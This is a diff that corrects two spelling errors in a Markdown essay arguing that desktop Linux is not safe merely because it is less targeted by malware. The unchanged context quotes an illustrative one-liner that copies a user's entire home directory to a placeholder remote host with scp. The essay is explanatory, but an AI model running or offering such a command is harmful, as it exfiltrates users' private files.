@@ -52,8 +52,8 @@ Something being open source does not imply that it is inherently private, secure
 
 ## But there is less malware on Linux!
 
-**Secuity by irrelevance does not work**. Just because there are fewer users of your favorite operating system does not make it any safer. 
+**Security by irrelevance does not work**. Just because there are fewer users of your favorite operating system does not make it any safer. 
 
-Ask yourself this: Would you ditch Windows for ReactOS considering that it is a lot less popular and is less targetted? Likewise, would you ditch Linux desktop when it becomes the mainstream solution for the BSDs or some niche operating systems just because they are less popular?
+Ask yourself this: Would you ditch Windows for ReactOS considering that it is a lot less popular and is less targeted? Likewise, would you ditch Linux desktop when it becomes the mainstream solution for the BSDs or some niche operating systems just because they are less popular?
 
 Malware for Linux does exist, and it is not hard to make. It can be something as trivial as a shell script or binary executing `scp -r ~/ malware@xx.xx.xx.xx:/data`. Due to the lack of application sandboxing or an application permission model, your computer can be compromised the moment you execute a malicious binary, shell script, or install script with or without root and with or without an exploit. This is, of course, not to discount the fact that many exploits do exist on Linux just like on any other operating systems as well.
